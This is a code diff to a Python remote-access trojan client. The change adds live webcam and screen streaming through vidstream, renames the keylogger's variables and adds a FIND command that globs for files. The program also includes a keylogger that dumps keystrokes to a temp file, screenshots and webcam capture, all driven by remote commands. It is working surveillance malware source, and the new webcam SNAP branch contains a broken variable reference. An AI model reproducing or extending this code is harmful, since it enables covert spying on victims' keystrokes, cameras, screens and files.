@@ -20,6 +20,9 @@ import webbrowser
 from threading import Thread
 import commands
 from pynput.keyboard import Listener
+import glob
+from vidstream import CameraClient
+from vidstream import ScreenShareClient
 
 user32 = ctypes.WinDLL('user32')
 kernel32 = ctypes.WinDLL('kernel32')
@@ -31,13 +34,13 @@ def im_2_b64(image):
     return img_str.decode("ascii")
 
 def keylogger():
-    global klgr
+    global running_keylogger
     global keylogger_file
-    global pressed_keys
+    global pressed_keys_map
     def on_press(key):
-        if klgr == True:
-            if not key in pressed_keys or not pressed_keys[key]:
-                pressed_keys[key]=True
+        if running_keylogger == True:
+            if not key in pressed_keys_map or not pressed_keys_map[key]:
+                pressed_keys_map[key]=True
                 try:
                     with open(keylogger_file, 'a') as f:
                         now = datetime.now()  # current date and time
@@ -46,15 +49,17 @@ def keylogger():
                 except:
                     pass
     def on_release(key):
-        if klgr == True:
-            pressed_keys[key]=False
+        if running_keylogger == True:
+            pressed_keys_map[key]=False
 
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
 async def client():
     # print("Start Test")
-    global klgr
+    global running_keylogger
+    global running_webcam
+    global running_screenshare
     global keylogger_file
     try:
         print("Trying to connect...")
@@ -225,38 +230,80 @@ async def client():
                         status = "ERROR"
                         output.append(str("-1"))
                         output.append(str(e))
-                elif request == 'SCREENSHOT':
-                    # list all availible drive letters
+                elif request == "WEBCAM":
                     try:
-                        image=pyautogui.screenshot()
-                        tmp=im_2_b64(image)
-                        output.append(tmp)
-                        output_type = "IMAGE"
-                    except Exception as e:
-                        status = "ERROR"
-                        output.append(str("-1"))
-                        output.append(str(e))
-                elif request == 'WEBCAM_SNAPSHOT':
-                    # list all availible drive letters
-                    try:
-                        cam = cv2.VideoCapture(0,cv2.CAP_DSHOW)
-                        return_value, cam_image = cam.read()
 
-                        # convert from openCV2 to PIL. Notice the COLOR_BGR2RGB which means that
-                        # the color is converted from BGR to RGB
-                        image = Image.fromarray(cv2.cvtColor(cam_image, cv2.COLOR_BGR2RGB))
-                        cam.release()
-                        output.append(im_2_b64(image))
-                        output_type = "IMAGE"
+                        if args[0] == "STREAM":
+                            if not running_webcam:
+                                webcam = CameraClient("127.0.0.1", 8080)
+                                webcam.start_stream()
+                                running_webcam = True
+                                output.append(str("Streaming..."))
+                            else:
+                                status = "ERROR"
+                                output.append(str("Streaming already started"))
+                        elif args[0] == "STOP":
+                            running_webcam=False
+                            webcam.stop_stream()
+                            output.append(str("Stop streaming..."))
+                        elif args[0] == "SNAP":
+                            if not running_webcam:
+                                webcam_snap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+                                return_value, cam_image = snap_cam.read()
+                                # convert from openCV2 to PIL. Notice the COLOR_BGR2RGB which means that
+                                # the color is converted from BGR to RGB
+                                image = Image.fromarray(cv2.cvtColor(webcam_snap, cv2.COLOR_BGR2RGB))
+                                webcam_snap.release()
+                                output.append(im_2_b64(image))
+                                output_type = "IMAGE"
+                            else:
+                                status = "ERROR"
+                                output.append(str("Can't make snapshot while streaming"))
+                        elif args[0] == "STATUS":
+                                output.append(f"Webcam is streaming: {running_webcam}")
+                        else:
+                            status = "ERROR"
+                            output.append(str("Unknown WEBCAM command"))
                     except Exception as e:
                         status = "ERROR"
-                        output.append(str("-1"))
                         output.append(str(e))
+
+                elif request == "SCREEN":
+                    try:
+
+                        if args[0] == "STREAM":
+                            if not running_screenshare:
+                                screencam = ScreenShareClient("127.0.0.1", 8081)
+                                screencam.start_stream()
+                                running_screenshare = True
+                                output.append(str("Streaming..."))
+                            else:
+                                status = "ERROR"
+                                output.append(str("Streaming already started"))
+                        elif args[0] == "STOP":
+                            running_screenshare=False
+                            screencam.stop_stream()
+                            output.append(str("Stop streaming..."))
+                        elif args[0] == "SNAP":
+                            image = pyautogui.screenshot()
+                            tmp = im_2_b64(image)
+                            output.append(tmp)
+                            output_type = "IMAGE"
+                        elif args[0] == "STATUS":
+                                output.append(f"Screen is streaming: {running_screenshare}")
+                        else:
+                            status = "ERROR"
+                            output.append(str("Unknown SCREEN command"))
+                    except Exception as e:
+                        status = "ERROR"
+                        output.append(str(e))
+
+
                 elif request== "KEYLOGGER":
                     try:
                         if args[0].upper() == "START":
-                            if not klgr:
-                                klgr = True
+                            if not running_keylogger:
+                                running_keylogger = True
                                 try:
                                     with open(keylogger_file, 'w') as f:
                                         now = datetime.now()  # current date and time
@@ -273,9 +320,8 @@ async def client():
                                 status = "WARNING"
                                 output.append(str("Keylogger is already running!"))
 
-
                         elif args[0].upper() == "STOP":
-                            klgr = False
+                            running_keylogger = False
                             output.append(str("Keylogger session is stopped, you can still download the dump file!"))
                         elif args[0].upper() == "DUMP":
                             with open(keylogger_file, 'r') as f:
@@ -298,7 +344,20 @@ async def client():
                         else:
                             output.append(f"Unknown subcommand: {str(args[0])}")
                     except:
-                        output.append(f"Keylogger is running: {str(klgr)}")
+                        output.append(f"Keylogger is running: {str(running_keylogger)}")
+                elif request== "FIND":
+                    try:
+                        try:
+                            pattern=args[0]
+                            for file in glob.glob(pattern, recursive=True):
+                                output.append(str(file))
+                        except Exception as e:
+                            status = "ERROR"
+                            output.append(str("-1"))
+                            output.append(str(e))
+                    except:
+                        for file in glob.glob("*", recursive=True):
+                            output.append(str(file))
 
                 elif request == "CD":
                     try:
@@ -341,11 +400,15 @@ async def client():
 
 while True:
     # Prepar stuff for keylogger
-    global pressed_keys
-    global klgr
+    global pressed_keys_map
+    global running_keylogger
     global keylogger_file
-    pressed_keys = {}
-    klgr=False
+    global running_webcam
+    global running_screenshare
+    pressed_keys_map = {}
+    running_keylogger=False
+    running_webcam=False
+    running_screenshare=False
 
 
     keylogger_file = tempfile.gettempdir() + "\logging.txt"
